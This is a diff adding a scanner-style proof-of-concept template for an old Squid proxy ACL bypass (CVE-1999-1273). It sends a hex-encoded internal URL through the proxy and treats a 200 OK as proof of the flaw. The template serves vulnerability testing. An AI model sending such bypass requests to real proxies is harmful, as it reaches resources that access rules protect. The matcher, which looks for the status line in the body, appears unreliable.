@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "Squid 1.1.20 代理服务器访问控制列表绕过漏洞验证。通过将目标 URL 使用十六进制转义序列编码（如 %68%74%74%70 代替 http），可绕过 ACL 规则访问本应被禁止的资源。发送包含十六进制编码 URL 的 HTTP 请求至 Squid 代理，若返回正常响应而非拒绝访问，则存在漏洞。"
+id = "POC-AVE-1999-1442"
+name = "Squid Internet Object Cache ACL Bypass via Hex Encoding PoC"
+severity = "high"
+tags = ["ave-1999-1442"]
+vuln_id = [
+    "CVE-1999-1273",
+    "AVE-1999-1442",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = '/{{BaseURL}}/{{hex_encode("http://internal.example.com/secret")}}'
+protocol = "http"
+
+[poc.requests.headers]
+Host = "internal.example.com"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "HTTP/1.1 200 OK",
+    "HTTP/1.0 200 OK",
+]
